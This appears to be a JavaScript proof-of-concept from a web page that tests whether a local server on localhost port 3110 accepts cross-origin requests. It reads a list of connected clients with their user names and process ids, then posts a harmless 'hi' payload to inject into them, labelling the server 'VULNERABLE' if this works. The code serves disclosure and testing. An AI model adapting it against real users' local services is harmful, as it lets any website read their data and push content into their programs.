// NOTE: server binds IPv6 loopback only, so use localhost (resolves to ::1), not 127.0.0.1.
const BASE = 'http://localhost:3110';
const PAYLOAD = 'hi';

async function go(){
  const r = document.getElementById('r');
  r.style.background = '#222';
  r.textContent = 'Sending POST with body "hi"...';

  try {
    // 1) Read the client list cross-origin (GET, CORS * applies).
    let clients = [];
    try {
      const g = await fetch(BASE + '/o', {method:'GET'});
      clients = await g.json().catch(()=>[]);
    } catch(_){}

    // Client rows are [pid, user, ver, status, placeId]; Clients header wants STRING pids.
    const pids = (Array.isArray(clients)?clients:[])
      .map(c => Array.isArray(c) ? c[0] : (c.pid||c.Pid))
      .filter(Boolean).map(String);

    // 2) Cross-origin inject with the "hi" payload.
    const res = await fetch(BASE + '/o', {
      method:'POST',
      headers:{
        'Content-Type':'text/plain',
        'Clients':JSON.stringify(pids.length?pids:["0"])
      },
      body: PAYLOAD
    });

    r.style.background = res.ok ? '#7a1020' : '#8a5a00';
    r.innerHTML = '<b>' + (res.ok?'VULNERABLE':'reachable, HTTP '+res.status) + '</b> — ' +
      'cross-origin request accepted (HTTP ' + res.status + ').<br>' +
      'Clients visible to this page: <pre>' + JSON.stringify(clients,null,2) + '</pre>' +
      'Check console/server output for the "hi" payload.';
  } catch(e){
    r.style.background = '#0b5';
    r.textContent = 'Request blocked / server not reachable: ' + e;
  }
}
